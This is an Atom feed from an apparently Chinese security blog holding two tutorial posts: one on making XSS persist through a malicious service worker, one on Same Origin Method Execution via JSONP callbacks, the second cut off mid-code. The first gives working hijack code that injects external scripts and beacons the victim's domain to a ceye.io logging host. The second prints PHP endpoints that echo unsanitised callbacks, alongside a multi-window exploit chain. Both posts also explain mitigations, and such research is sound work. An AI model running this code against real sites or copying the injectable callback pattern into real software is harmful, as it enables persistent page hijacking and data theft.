<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>MSAREHERE</title>
  <icon>https://www.gravatar.com/avatar/136b0de13f3affbb7643d3f2f821338d</icon>
  <subtitle>Just have a little faith</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://michaelwayneliu.github.io/"/>
  <updated>2018-01-12T14:42:10.851Z</updated>
  <id>https://michaelwayneliu.github.io/</id>
  
  <author>
    <name>MS</name>
    <email>18380217351@163.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>service worker--xss进化</title>
    <link href="https://michaelwayneliu.github.io/2018/01/12/service-worker-xss%E8%BF%9B%E5%8C%96/"/>
    <id>https://michaelwayneliu.github.io/2018/01/12/service-worker-xss进化/</id>
    <published>2018-01-12T14:19:21.000Z</published>
    <updated>2018-01-12T14:42:10.851Z</updated>
    
    <content type="html"><![CDATA[<p>我们可以用 JS 代码来拦截浏览器当前域的 HTTP 请求，并设置缓存的文件，直接返回，不经过 web 服务器，使目标只要在线就可以被我们控制。可怕的是，即便 xss 漏洞被修复了，攻击仍然持续，并且渗透到攻击范围内的每一个 url。<br><a id="more"></a></p><h2 id="Service-Worker-是什么？"><a href="#Service-Worker-是什么？" class="headerlink" title="Service Worker 是什么？"></a>Service Worker 是什么？</h2><p>一个 service worker 是一段运行在浏览器后台进程里的脚本，它独立于当前页面。在将来，基于它可以实现消息推送，静默更新以及地理围栏等服务，但是目前它首先要具备的功能是拦截和处理网络请求，包括可编程的响应缓存管理。<br>Service Worker是基于Web Worker的事件驱动的，他们执行的机制都是新开一个线程去处理一些额外的任务。对于Web Worker，我们可以使用它来进行复杂的计算，因为它并不阻塞浏览器主线程的渲染。而Service Worker，我们可以用它来进行本地缓存，相当于一个本地的proxy。说起缓存，我们会想起我们常用的一些缓存技术来缓存我们的静态资源，但是老的方式是不支持调试的，灵活性不高。使用Service Worker来进行缓存，我们可以用javascript代码来拦截浏览器的http请求，并设置缓存的文件，直接返回，不经过web服务器。</p><p><img src="/2018/01/12/service-worker-xss进化/SW1.png" alt="image"></p><p>我们可以用 JS 代码来拦截浏览器当前域的 HTTP 请求，并设置缓存的文件，直接返回，不经过 web 服务器，使目标只要在线就可以被我们控制。可怕的是，即便 xss 漏洞被修复了，攻击仍然持续，并且渗透到攻击范围内的每一个 url。<br>由于这项技术能量太大，所以在设计的时候对他做了一定的约束：只在 HTTPS 下工作，安装ServiceWorker的脚本需要当前域下，且返回的 content-type 包含javascript。</p><p>在 worker 线程中，可以获得下列对象</p><ol><li>navigator对象</li><li>location对象，只读</li><li>XMLHttpRequest对象</li><li>setTimeout/setInterval方法</li><li>Application Cache</li><li>通过importScripts()方法加载其他脚本</li><li>创建新的Web Worker</li></ol><p>Worker 线程不能获得下列对象</p><ol><li>DOM对象</li><li>window对象</li><li>document对象</li><li>parent对象</li></ol><p>所以在worker线程中，不能进行dom元素的更新。也就是说在 Worker 的作用域中我们难以完成 XSS 攻击，所以还是得通过劫持 来完成攻击。</p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>攻击需要的点：</p><p>1.注册service worker</p><p>需要一个可以xss的点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (&apos;serviceWorker&apos; in navigator) &#123;  </span><br><span class="line"> navigator.serviceWorker.register(&apos;/hack.js&apos;)</span><br><span class="line"> .then(function(registration) &#123;</span><br><span class="line"> console.log(&apos;ServiceWorker registration successful with scope: &apos;, registration.scope);</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>在这个例子中，service worker文件被放在这个域的根目录下，这意味着service worker和网站同源。换句话说，这个service work将会收到这个域下的所有fetch事件。如果我将service worker文件注册为/example/hack.js，那么，service worker只能收到/example/路径下的fetch事件（例如： /example/page1/, /example/page2/）。</p><p>2.hack.js可以是上传到网站的js文件，也可以是一个jsonp的接口。hack.js的内容如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">this.addEventListener(&apos;fetch&apos;, function(event) &#123;</span><br><span class="line">   event.respondWith(new Response(&quot;</span><br><span class="line">&lt;h1&gt; Intercepted!&lt;/h1&gt;</span><br><span class="line">&quot;));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>试图拦截请求，重定向到给定url，失败<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">self.addEventListener(&apos;fetch&apos;, function (event) &#123;  </span><br><span class="line"> event.respondWith(</span><br><span class="line"> caches.match(event.request).then(function(res)&#123;</span><br><span class="line"> if(res)&#123;//如果有缓存则使用缓存</span><br><span class="line"> return res;</span><br><span class="line"> &#125;</span><br><span class="line"> return requestBackend(event);//没缓存就进行缓存</span><br><span class="line"> &#125;)</span><br><span class="line"> )</span><br><span class="line">&#125;);</span><br><span class="line">function requestBackend(event)&#123;  </span><br><span class="line">var url = event.request.clone();  </span><br><span class="line"> if(url.url==&apos;http://127.0.0.1/aaa.html&apos;)&#123;//判断是否为需要劫持的资源</span><br><span class="line">url.url=&apos;//html5sec.org/test.js&apos;;  </span><br><span class="line"> &#125;</span><br><span class="line"> return fetch(url).then(function(res)&#123;</span><br><span class="line"> //检测是否为有效响应</span><br><span class="line"> if(!res || res.status !== 200 || res.type !== &apos;basic&apos;)&#123;</span><br><span class="line"> return res;</span><br><span class="line"> &#125;</span><br><span class="line"> var response = res.clone();</span><br><span class="line"> caches.open(&apos;v1&apos;).then(function(cache)&#123;</span><br><span class="line"> cache.put(event.request, response);</span><br><span class="line"> &#125;);</span><br><span class="line"></span><br><span class="line"> return res;</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>原因是request.url是只读的<br><img src="/2018/01/12/service-worker-xss进化/request_url只读.png" alt="image"></p><p>拦截针对某个url的请求，返回特定内容，成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">self.addEventListener(&apos;fetch&apos;, function (event) &#123;  </span><br><span class="line"> event.respondWith(</span><br><span class="line"> //console.log(event.request)</span><br><span class="line"> caches.match(event.request).then(function(res)&#123;</span><br><span class="line"> if(res)&#123;//如果有缓存则使用缓存</span><br><span class="line"> return res;</span><br><span class="line"> &#125;</span><br><span class="line"> return requestBackend(event);//没缓存就进行缓存</span><br><span class="line"> &#125;)</span><br><span class="line"> )</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">function requestBackend(event)&#123;  </span><br><span class="line">var url = event.request.clone();  </span><br><span class="line">console.log(url)</span><br><span class="line"> if(url.url==&apos;http://127.0.0.1/aaa.html&apos;)&#123;//判断是否为需要劫持的资源</span><br><span class="line"></span><br><span class="line">  return new Response(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;, &#123;headers: &#123; &apos;Content-Type&apos;: &apos;text/html&apos; &#125;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  return fetch(url).then(function(res)&#123;</span><br><span class="line"> //检测是否为有效响应</span><br><span class="line"> if(!res || res.status !== 200 || res.type !== &apos;basic&apos;)&#123;</span><br><span class="line"> return res;</span><br><span class="line"> &#125;</span><br><span class="line"> var response = res.clone();</span><br><span class="line"> caches.open(&apos;v1&apos;).then(function(cache)&#123;</span><br><span class="line"> cache.put(event.request, response);</span><br><span class="line"> &#125;);</span><br><span class="line"></span><br><span class="line"> return res;</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>具体的攻击过程：</p><p>一开始未被攻击的aaa.html正常显示。<br><img src="/2018/01/12/service-worker-xss进化/aaa正常显示.png" alt="image"></p><p>用户访问存在xss的页面hijack.html。注册上传到网站的1.js。</p><p><img src="/2018/01/12/service-worker-xss进化/1.js.png" alt="image"><br>或是利用存在jsonp注入的url进行注册。<br><img src="/2018/01/12/service-worker-xss进化/jsonp接口.png" alt="image"><br>此时再访问aaa.html就如图了。重启浏览器依然如此。访问其他页面可以正常访问。<br><img src="/2018/01/12/service-worker-xss进化/中招后.png" alt="image"></p><p>service worker只支持https的页面。在github测试成功。<br><img src="/2018/01/12/service-worker-xss进化/github测试.png" alt="image"></p><h2 id="继续玩"><a href="#继续玩" class="headerlink" title="继续玩"></a>继续玩</h2><p>如何实现一个SW远控<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">self.addEventListener(&apos;fetch&apos;, function (event) &#123;  </span><br><span class="line"> event.respondWith(</span><br><span class="line"> //console.log(event.request)</span><br><span class="line"> caches.match(event.request).then(function(res)&#123;</span><br><span class="line"> if(res)&#123;//如果有缓存则使用缓存</span><br><span class="line"> return res;</span><br><span class="line"> &#125;</span><br><span class="line"> return requestBackend(event);//没缓存就进行缓存</span><br><span class="line"> &#125;)</span><br><span class="line"> )</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">function requestBackend(event)&#123;  </span><br><span class="line">var url = event.request.clone();  </span><br><span class="line">console.log(url)</span><br><span class="line"> if(url.url==&apos;http://127.0.0.1/aaa.php&apos;)&#123;//判断是否为需要劫持的资源</span><br><span class="line">  // importScripts(&apos;3.js&apos;);</span><br><span class="line">  return new Response(&quot;&lt;div id=&apos;div1&apos;&gt;&lt;p id=&apos;p1&apos;&gt;这是一个段落&lt;/p&gt;&lt;p id=&apos;p2&apos;&gt;这是另一个段落&lt;/p&gt;&lt;/div&gt;&lt;script src=&apos;http://127.0.0.1/3.js&apos;&gt;&lt;/script&gt;&lt;script src=&apos;http://html5sec.org/test.js&apos;&gt;var head = document.getElementsByTagName(&apos;head&apos;)[0];var ele=document.createElement(&apos;script&apos;);ele.src = &apos;http://&apos;+document.domain+&apos;.pxmnr7.ceye.io&apos;;head.appendChild(ele);&lt;/script&gt;&quot;, &#123;headers: &#123; &apos;Content-Type&apos;: &apos;text/html&apos; &#125;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  return fetch(url).then(function(res)&#123;</span><br><span class="line"> //检测是否为有效响应</span><br><span class="line"> if(!res || res.status !== 200 || res.type !== &apos;basic&apos;)&#123;</span><br><span class="line"> return res;</span><br><span class="line"> &#125;</span><br><span class="line"> var response = res.clone();</span><br><span class="line"> caches.open(&apos;v1&apos;).then(function(cache)&#123;</span><br><span class="line"> cache.put(event.request, response);</span><br><span class="line"> &#125;);</span><br><span class="line"></span><br><span class="line"> return res;</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>重点关注Reponse，Response只拦截aaa.php，注入外部js。<br>其中3.js内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alert(11111);</span><br><span class="line">var para=document.createElement(&apos;p&apos;);var node=document.createTextNode(&apos;这是新段落。&apos;);para.appendChild(node);var element=document.getElementById(&apos;div1&apos;);element.appendChild(para);</span><br><span class="line">var head = document.getElementsByTagName(&apos;head&apos;)[0];var ele=document.createElement(&apos;script&apos;);ele.src = &apos;http://&apos;+document.domain+&apos;.pxmnr7.ceye.io&apos;;head.appendChild(ele);</span><br></pre></td></tr></table></figure></p><p>目的为修改页面内容，继续注入外部JS,这里注入的JS仅供娱乐，目的是定位是哪个站正在遭受攻击。</p><p>同样，用户先访问aaa.php，正常。<br><img src="/2018/01/12/service-worker-xss进化/aaa正常显示.png" alt="image"><br>不小心访问了hijack.html。这时候回头继续看aaa.php。<br><img src="/2018/01/12/service-worker-xss进化/注入.png" alt="image"><br>可以看到出现了一个新段落，达到了修改页面内容和继续注入外部JS的目的。<br><img src="/2018/01/12/service-worker-xss进化/注入JS.png" alt="image"><br>最后看看ceye上的结果<br><img src="/2018/01/12/service-worker-xss进化/ceye.png" alt="image"><br>这时只要目标访问aaa.php，就能看到他上线。当然也可以设定SW工作在整个域下或者某个目录下。</p><h2 id="解除攻击"><a href="#解除攻击" class="headerlink" title="解除攻击"></a>解除攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">navigator.serviceWorker.getRegistration()</span><br><span class="line">  .then(function(registration) &#123;</span><br><span class="line">  registration.unregister();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>最快的办法是在 Chrome 下打开 chrome://serviceworker-internals</p><h2 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h2><p>Jsonp 接口的 callback 做白名单，或者只允许特定字符（比如数字、字母和下划线）。</p><p>Jsonp所在域不应该存在 XSS（一切类型）和用户可控的 js 文件。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们可以用 JS 代码来拦截浏览器当前域的 HTTP 请求，并设置缓存的文件，直接返回，不经过 web 服务器，使目标只要在线就可以被我们控制。可怕的是，即便 xss 漏洞被修复了，攻击仍然持续，并且渗透到攻击范围内的每一个 url。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="前端安全" scheme="https://michaelwayneliu.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="XSS" scheme="https://michaelwayneliu.github.io/tags/XSS/"/>
    
      <category term="JSONP" scheme="https://michaelwayneliu.github.io/tags/JSONP/"/>
    
      <category term="Service Worker" scheme="https://michaelwayneliu.github.io/tags/Service-Worker/"/>
    
  </entry>
  
  <entry>
    <title>SOME攻击</title>
    <link href="https://michaelwayneliu.github.io/2017/12/21/SOME%E6%94%BB%E5%87%BB/"/>
    <id>https://michaelwayneliu.github.io/2017/12/21/SOME攻击/</id>
    <published>2017-12-21T13:54:47.000Z</published>
    <updated>2017-12-21T11:18:32.638Z</updated>
    
    <content type="html"><![CDATA[<p>有的时候当我们挖到一个XSS漏洞时，发现利用十分受限，应用过滤了绝大部分的标签，最后竟然只能X入一个button，而这个button别人轻易不会去点击，这时又该怎么办呢？<br><a id="more"></a></p><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>有的时候当我们挖到一个XSS漏洞时，发现利用十分受限，应用过滤了绝大部分的标签，最后竟然只能X入一个button，而这个button别人轻易不会去点击，这时又该怎么办呢？</p><h3 id="SOME攻击相关介绍"><a href="#SOME攻击相关介绍" class="headerlink" title="SOME攻击相关介绍"></a>SOME攻击相关介绍</h3><p>上述是我想出来的可以进行SOME攻击的一种场景。下面来看看这玩意到底是啥。SOME是同源方法执行漏洞（Same Origin Method Execution）的简称，SOME是web应用程序攻击方法中的一种，类似于Hijacking攻击，它通过强制受害者在endpoints的域上执行任意页面的脚本方法来滥用回调endpoints，理论上任何具备点击功能（比如添加删除、授权确认等）的网站都存在遭受这种攻击的可能，缺陷是不能带参数操作。<br>既然叫同源方法执行漏洞，要想利用该漏洞针对的就是同源网站下的页面。同源简单的来说就是通信双方协议、域名、端口都要一致。同源保证了网站间数据交换的相对安全，比如A网站不能随意去拿或者操作B网站的数据。对于功能丰富的网站来说，很多时候需要把其他网站的资源拿过来用用，为了突破同源策略带来的一些限制，出现了JSONP、PostMessage等技术。<br>JSONP(JSON with Padding)是啥呢？个人理解，利用script标签的跨域属性从不是一定是同域的网站拿来数据用本地的JS函数执行。不懂用代码自己试试就理解啦。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">服务端实现callback函数</span><br><span class="line">&lt;?php</span><br><span class="line">//服务端返回JSON数据</span><br><span class="line">$arr=array(&apos;a&apos;=&gt;1,&apos;b&apos;=&gt;2,&apos;c&apos;=&gt;3,&apos;d&apos;=&gt;4,&apos;e&apos;=&gt;5);</span><br><span class="line">$result=json_encode($arr);</span><br><span class="line">//动态执行回调函数</span><br><span class="line">$callback=$_GET[&apos;callback&apos;];</span><br><span class="line">echo $callback.&quot;($result)&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">客户端发起callback请求</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function jsonpCallback(result) &#123;</span><br><span class="line">//alert(result);</span><br><span class="line">for(var i in result) &#123;</span><br><span class="line">alert(i+&quot;:&quot;+result[i]);//循环输出a:1,b:2,etc.</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">var JSONP=document.createElement(&quot;script&quot;);</span><br><span class="line">JSONP.type=&quot;text/javascript&quot;;</span><br><span class="line">JSONP.src=&quot;http://127.0.0.1.com/cb.php?callback=jsonpCallback&quot;;</span><br><span class="line">document.getElementsByTagName(&quot;head&quot;)[0].appendChild(JSONP);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>正常的callback请求只允许[A-Za-z0-9_.]，也就是说xss要用到的字符比如&lt;、&gt;、&amp;、#之类的都是不在允许的范围内的，所以理论上是无法实施xss攻击的。</p><h3 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h3><p>这种攻击也有很多限制</p><pre><code>条件：目标同域下存在JSONP接口，允许.（点号），并且允许用户提交callback的函数名，callback函数能被JavaScript执行危害：应用自动授权(OAuth认证)、自动点赞等</code></pre><p>如果条件满足，举个例子，我本地www\jsonp\base_example目录下存在main.html，step1.html，function.html，jsonp.php，jsonp_data.php<br>其中main.html内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;SOME Main&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;a href=&quot;step1.html&quot; target=&quot;_blank&quot; &gt;aaaaaaa&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt; </span><br><span class="line">function startSOME() &#123; </span><br><span class="line">myWindow=window.open(&apos;http://127.0.0.1/jsonp/base_example/step1.html&apos;,&apos;&apos;,&apos;width=200,height=100&apos;);</span><br><span class="line">// myWindow.document.write(&quot;This is &apos;myWindow&apos;&quot;);</span><br><span class="line">// myWindow.focus();</span><br><span class="line">window.location.href = &quot;http://127.0.0.1/jsonp/base_example/function.html&quot;;</span><br><span class="line">&#125; </span><br><span class="line">startSOME();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>可以看出来，打开main.html会打开一个小窗口step1.html，并且重定向到function.html<br>,然后过了三秒，弹出了一个框。但是看了看function.html里面的内容，并没有弹窗操作啊？<br><img src="/2017/12/21/SOME攻击/SOME.png" alt="image"><br>所以再来看看step1.html和function.html呢<br>小窗口step1.html的内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">function waitForDOM() &#123;</span><br><span class="line">window.location.href =&quot;http://127.0.0.1/jsonp/base_example/jsonp.php?callback=window.opener.shareAllPhotos&quot;;</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(waitForDOM,3000);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>它会等三秒，这里等不等根据实际应用场景决定，不用纠结。然后呢，小窗口step1.html又重定向了，重定向到一个看起来像JSONP接口页面了。<br>页面有啥呢？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Vulnerable JSONP endpoint caller&lt;/title&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;script src=&quot;http://127.0.0.1/jsonp/base_example/jsonp_data.php?callback=&apos;.$_GET[&quot;callback&quot;].&apos;&quot;&gt;&lt;/script&gt;&apos;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>这个页面的功能原来是根据get操作得到的值向一个JSONP接口发起请求，而且callback的JS函数都定好了。<br>快接近真相了，jsonp_data.php的内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo $_GET[&quot;callback&quot;] . &quot;(&#123; my_photo : &apos;photo&apos; &#125;);&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>所以这里返回的结果就是要让jsonp.php执行window.opener.shareAllPhotos({ my_photo : ‘photo’ })操作呗。那么问题来了，window.opener是谁？jsonp.php？不，看看<a href="http://www.w3school.com.cn/jsref/prop_win_opener.asp" target="_blank" rel="noopener">这个</a>，可知opener 属性是一个可读可写的属性，可返回对创建该窗口的 Window 对象的引用。所以window.opener是最开始打开step1.html小窗口的main.html，但是现在它重定向到function.html，window.opener也就是function.html。所以window.opener.shareAllPhotos({ my_photo : ‘photo’ })操作的也就是function.html。<br>这是function.html的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Google Photos&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt; </span><br><span class="line">    function shareAllPhotos(data) &#123; </span><br><span class="line">        prompt(data.my_photo);</span><br><span class="line">    &#125; </span><br><span class="line">    console.log(window.opener);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>这个方法成功的关键因素是，当一个窗口文件被重定向之后，它的窗口对象仍然保存在原始分配的内存空间中，如果窗口A打开了窗口B，用户代理将会创建一个指向窗口A的引用，当窗口A的文件内容被修改（重定向）后，引用并不会被清除，而且窗口B仍然能够使用窗口属性值来引用它。</p><p>你可能会说这个玩意有什么用啊，其实上述例子是谷歌曾经发生过的一个漏洞，攻击者通过上述流程劫持了window.opener.shareAllPhotos函数，利用一个有漏洞的回调函数，把谷歌上的私人相片发到了攻击者指定的域名。<br>具体的执行流程可以看下图<br><img src="/2017/12/21/SOME攻击/1.png" alt="image"><br><img src="/2017/12/21/SOME攻击/2.png" alt="image"><br><img src="/2017/12/21/SOME攻击/3.png" alt="image"><br><img src="/2017/12/21/SOME攻击/4.png" alt="image"><br><img src="/2017/12/21/SOME攻击/5.png" alt="image"><br>再看一个例子呢，假设我找到了一个微博的jsonp利用点，而在我本地某目录下有两个文件test.php和test2.html<br>test.php内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Vulnerable JSONP test&lt;/title&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">myWindow=window.open(&apos;http://127.0.0.1/jsonp/example/test2.html&apos;,&apos;&apos;,&apos;width=200,height=100&apos;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;button onclick=&apos;alert(&quot;成了！！！&quot;)&apos;&gt;成了&lt;/button&gt;</span><br><span class="line">&lt;a href=&quot;aaa&quot;&gt;a&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;bbb&quot;&gt;b&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;ccc&quot;&gt;c&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;ddd&quot;&gt;d&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;aaa&quot;&gt;a&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;bbb&quot;&gt;b&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;ccc&quot;&gt;c&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;ddd&quot;&gt;d&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;aaa&quot;&gt;a&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;bbb&quot;&gt;b&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;ccc&quot;&gt;c&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;ddd&quot;&gt;d&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;aaa&quot;&gt;a&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;bbb&quot;&gt;b&lt;/a&gt;</span><br><span class="line">&lt;a 